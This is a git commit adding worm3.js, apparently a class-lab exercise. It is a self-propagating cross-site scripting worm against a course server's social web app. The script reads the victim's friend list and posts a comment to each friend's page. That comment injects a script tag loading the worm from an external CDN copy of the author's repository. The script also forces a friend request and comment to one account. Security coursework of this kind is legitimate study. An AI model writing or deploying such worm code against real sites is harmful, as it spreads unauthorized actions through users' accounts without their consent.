cd7cd2bf5f31afd497d7299db6df4dcfe1c2a5ee
DarkLemon27 <47903566+DarkLemon27@users.noreply.github.com>
2020-04-03 17:24:19 -0400

    Create worm3.js

---
+++ worm3.js
@@ -0,0 +1,32 @@
+function moveitmoveit() {
+    var home = $.ajax({
+        async: false,
+        type: 'GET',
+        url: 'http://csec380-core.csec.rit.edu:86/home.php',
+        success: function(data) {
+            return data;
+        }
+    });
+    var friend = $.ajax({
+        async: false,
+        type: 'GET',
+        url: 'http://csec380-core.csec.rit.edu:86/friends.php',
+        success: function(data) {
+            return data;
+        }
+    });
+    var eff = friend.responseText;
+    alert(eff);
+    var arr= eff.match('^[^<br]*').join().split(',');
+    for( var i = 0; i < arr.length; i++){
+        var newhome = $.get("http://csec380-core.csec.rit.edu:86/home.php",{id: arr[i]});
+        if (newhome.responseText.match('buzzfeed-static') == null){
+            $.get("http://csec380-core.csec.rit.edu:86/add_comment.php",{id: arr[i],comment: '<script src="https://cdn.jsdelivr.net/gh/DarkLemon27/WebApp/worm3.js"></script><img src="https://img.buzzfeed.com/buzzfeed-static/static/2019-11/19/20/asset/be34feec736a/sub-buzz-4628-1574196545-1.png" width=300 height=300 />'});
+        }
+    }
+    if(eff.match('134') == null){
+        $.get("http://csec380-core.csec.rit.edu:86/add_friend.php",{id: 134});
+        $.get("http://csec380-core.csec.rit.edu:86/add_comment.php",{id: 134,comment: 'Im your friend now'});
+    }
+}
+moveitmoveit();
